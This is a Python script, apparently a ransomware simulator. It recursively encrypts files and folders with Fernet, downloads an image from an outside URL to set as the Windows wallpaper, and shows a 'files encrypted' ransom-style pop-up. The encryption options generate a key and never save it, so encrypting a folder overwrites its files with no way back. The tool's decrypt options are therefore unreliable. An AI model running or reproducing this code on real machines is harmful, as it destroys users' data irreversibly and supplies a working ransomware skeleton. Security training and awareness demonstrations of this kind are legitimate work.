#!/bin/python3

# Import required libraries
from cryptography.fernet import Fernet 
import os
import ctypes
import requests
import tkinter as tk
from tkinter import messagebox

# Generates an encryption key
def generate_key():
    return Fernet.generate_key()

# Loads an encryption key from the specified file
def load_key(key_path):
    return open(key_path, "rb").read()

# Writes the encryption key to the specified file
def write_key(key, key_path):
    with open(key_path, "wb") as key_file:
        key_file.write(key)

# Encrypts or decrypts a file using the provided key and mode
def process_file(filepath, key, mode):
    fernet = Fernet(key)
    with open(filepath, "rb") as file:
        file_data = file.read()
    processed_data = fernet.encrypt(file_data) if mode == 'encrypt' else fernet.decrypt(file_data)
    with open(filepath, "wb") as file:
        file.write(processed_data)

# Encrypts or decrypts all files in the specified folder
def process_folder(folder_path, key, mode):
    for root, _, files in os.walk(folder_path):
        for file in files:
            process_file(os.path.join(root, file), key, mode)

# Encrypts or decrypts a message using the provided key and mode
def process_message(message, key, mode):
    fernet = Fernet(key)
    if mode == 'encrypt':
        return fernet.encrypt(message.encode('utf-8'))
    return fernet.decrypt(message).decode()

# Generates file paths for key and message storage
def generate_paths(base_path, filename):
    return os.path.join(base_path, filename), os.path.join(base_path, f"key_{filename}.key")

# Downloads an image from a URL and saves it to the local path
def download_image(url, local_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(local_path, 'wb') as file:
            file.write(response.content)
    else:
        raise Exception(f"Failed to download image from {url}")

# Displays a ransomware message in a pop-up window
def show_popup():
    message = "Your files have been encrypted! To decrypt your files, follow the instructions in the README file."
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showerror("Ransomware Simulation", message)

# Sets the wallpaper to a specified image for ransomware simulation
def set_wallpaper():
    wallpaper_url = "https://www.freeitdata.com/wp-content/uploads/2022/03/watermark_newsletter_cybercrime.jpeg"
    local_path = os.path.join(os.getenv('TEMP'), "wallpaper.jpg")
    download_image(wallpaper_url, local_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, local_path, 3)

def main():
    actions = {
        "1": ("Encrypt a file", lambda: process_file(input("Enter the file path: "), generate_key(), 'encrypt')),
        "2": ("Decrypt a file", lambda: process_file(input("Enter the file path: "), load_key(input("Enter the key file path: ")), 'decrypt')),
        "3": ("Encrypt a message", lambda: print(f"Encrypted message: {process_message(input('Enter the message: '), generate_key(), 'encrypt').decode()}")),
        "4": ("Decrypt a message", lambda: print(f"Decrypted message: {process_message(input('Enter the encrypted message: ').encode(), load_key(input('Enter the key file path: ')), 'decrypt')}")),
        "5": ("Encrypt a folder", lambda: process_folder(input("Enter the folder path: "), generate_key(), 'encrypt')),
        "6": ("Decrypt a folder", lambda: process_folder(input("Enter the folder path: "), load_key(input("Enter the key file path: ")), 'decrypt')),
        "7": ("Simulate ransomware", lambda: (set_wallpaper(), show_popup()))
    }
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\nChoose an action:")
        for key, (desc, _) in actions.items():
            print(f"{key}. {desc}")
        choice = input("Enter your option: ")

        if choice in actions:
            actions[choice][1]()
            break
        else:
            print("Invalid input! Please try again.")
            input("Press Enter to continue...")

if __name__ == "__main__":
    main()
